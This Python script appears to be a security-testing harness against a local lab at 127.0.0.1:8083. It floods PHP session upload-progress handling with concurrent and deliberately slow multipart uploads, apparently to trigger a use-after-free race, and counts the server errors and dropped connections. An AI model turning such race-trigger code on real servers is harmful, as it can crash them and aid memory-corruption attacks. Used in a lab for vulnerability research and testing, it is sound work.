#!/usr/bin/env python3
import re
import requests
import socket
import threading
import time
import io
import sys

TARGET = "http://127.0.0.1:8083"
LOCK = threading.Lock()

comm_anomalies = []
http_5xx = []
http_4xx = []
other_errors = []

HTTP_STATUS_RE = re.compile(rb"HTTP/1\.[01] (\d{3})")


def record(bucket, msg):
    with LOCK:
        bucket.append(msg)


def report_error(message):
    print(f"ERROR: {message}", file=sys.stderr)


def sendall_safe(sock, data):
    total = 0
    while total < len(data):
        sent = sock.send(data[total:])
        if sent == 0:
            raise BrokenPipeError("socket send returned 0")
        total += sent


def session_progress_race(thread_id):
    session = requests.Session()
    sid = f"uafasan{thread_id}"

    for i in range(200):
        try:
            files = {
                'PHP_SESSION_UPLOAD_PROGRESS': (None, f'race_{i}_{thread_id}'),
                'file': ('test.txt', io.BytesIO(b'A' * 1000), 'application/octet-stream'),
            }
            r = session.post(
                f"{TARGET}/session.php",
                files=files,
                cookies={'PHPSESSID': sid},
                timeout=5,
            )
            if r.status_code >= 500:
                record(http_5xx, f"thread {thread_id}, attempt {i}: HTTP {r.status_code}")
            elif r.status_code >= 400:
                record(http_4xx, f"thread {thread_id}, attempt {i}: HTTP {r.status_code}")
        except requests.exceptions.ConnectionError:
            record(comm_anomalies, f"thread {thread_id}, attempt {i}: connection error")
        except Exception as e:
            record(other_errors, f"thread {thread_id}, attempt {i}: {type(e).__name__}: {e}")


def session_gc_race(thread_id):
    session = requests.Session()

    for i in range(200):
        try:
            sid = f"gcasan{thread_id}x{i}"
            files = {
                'PHP_SESSION_UPLOAD_PROGRESS': (None, f'gc_trigger_{i}'),
                'file': ('test.txt', io.BytesIO(b'B' * 500), 'application/octet-stream'),
            }
            r = session.post(
                f"{TARGET}/upload.php",
                files=files,
                cookies={'PHPSESSID': sid},
                timeout=5,
            )
            if r.status_code >= 500:
                record(http_5xx, f"GC thread {thread_id}, attempt {i}: HTTP {r.status_code}")
            elif r.status_code >= 400:
                record(http_4xx, f"GC thread {thread_id}, attempt {i}: HTTP {r.status_code}")
        except requests.exceptions.ConnectionError:
            record(comm_anomalies, f"GC thread {thread_id}, attempt {i}: connection error")
        except Exception as e:
            record(other_errors, f"GC thread {thread_id}, attempt {i}: {type(e).__name__}: {e}")


def stale_pointer_race(thread_id):
    for i in range(50):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect(('127.0.0.1', 8083))

            sid = f"stale{thread_id}x{i}"

            body_start = (
                b"--BOUNDARY\r\n"
                b"Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
                b"stale_test\r\n"
                b"--BOUNDARY\r\n"
                b"Content-Disposition: form-data; name=\"file\"; filename=\"test.txt\"\r\n"
                b"Content-Type: application/octet-stream\r\n\r\n"
            )
            body_end = b"\r\n--BOUNDARY--\r\n"
            file_data = b"C" * 5000
            total_len = len(body_start) + len(file_data) + len(body_end)

            header = (
                f"POST /upload.php HTTP/1.1\r\n"
                f"Host: localhost\r\n"
                f"Connection: close\r\n"
                f"Cookie: PHPSESSID={sid}\r\n"
                f"Content-Type: multipart/form-data; boundary=BOUNDARY\r\n"
                f"Content-Length: {total_len}\r\n"
                f"\r\n"
            ).encode()

            sendall_safe(s, header + body_start)
            for byte in file_data[:100]:
                sendall_safe(s, bytes([byte]))
                time.sleep(0.001)
            sendall_safe(s, file_data[100:] + body_end)

            resp = b""
            recv_error = None
            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                except Exception as e:
                    recv_error = e
                    break
            s.close()

            if recv_error and not resp:
                record(comm_anomalies, f"stale thread {thread_id}, attempt {i}: recv failed ({type(recv_error).__name__})")
            elif not resp:
                record(comm_anomalies, f"stale thread {thread_id}, attempt {i}: empty response")
            elif recv_error:
                record(comm_anomalies, f"stale thread {thread_id}, attempt {i}: partial response + recv error ({type(recv_error).__name__})")
            else:
                m = HTTP_STATUS_RE.search(resp[:64])
                if m:
                    code = int(m.group(1))
                    if code >= 500:
                        record(http_5xx, f"stale thread {thread_id}, attempt {i}: HTTP {code}")
                    elif code >= 400:
                        record(http_4xx, f"stale thread {thread_id}, attempt {i}: HTTP {code}")
                else:
                    record(other_errors, f"stale thread {thread_id}, attempt {i}: unparseable response")

        except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError) as e:
            record(comm_anomalies, f"stale thread {thread_id}, attempt {i}: {type(e).__name__}")
        except Exception as e:
            record(other_errors, f"stale thread {thread_id}, attempt {i}: {type(e).__name__}: {e}")


def run_phase(name, target_fn, args_range):
    threads = []
    for t in args_range:
        th = threading.Thread(target=target_fn, args=(t,))
        threads.append(th)
        th.start()
    for th in threads:
        th.join(timeout=120)
    still_alive = [th for th in threads if th.is_alive()]
    if still_alive:
        for th in still_alive:
            th.join(timeout=30)
    dangling = sum(1 for th in threads if th.is_alive())
    if dangling:
        report_error(
            f"{name}: {dangling} thread(s) did not finish; results are incomplete. "
            "Active threads are not cancelled and may continue making requests."
        )
        sys.exit(1)


try:
    r = requests.get(f"{TARGET}/index.php", timeout=5)
    if r.status_code >= 400:
        report_error(f"initial lab check returned HTTP {r.status_code}")
        sys.exit(1)
except Exception as e:
    report_error(f"lab is not reachable: {e}")
    sys.exit(1)

run_phase("upload-progress requests", session_progress_race, range(8))
run_phase("uploads with fresh session IDs", session_gc_race, range(4))
run_phase("slowly transmitted uploads", stale_pointer_race, range(4))

if comm_anomalies or http_5xx or http_4xx or other_errors:
    report_error(
        f"communication failures={len(comm_anomalies)}, "
        f"HTTP 5xx={len(http_5xx)}, HTTP 4xx={len(http_4xx)}, "
        f"other errors={len(other_errors)}"
    )
    for bucket in (comm_anomalies, http_5xx, http_4xx, other_errors):
        for message in bucket[:5]:
            report_error(message)
    sys.exit(1)
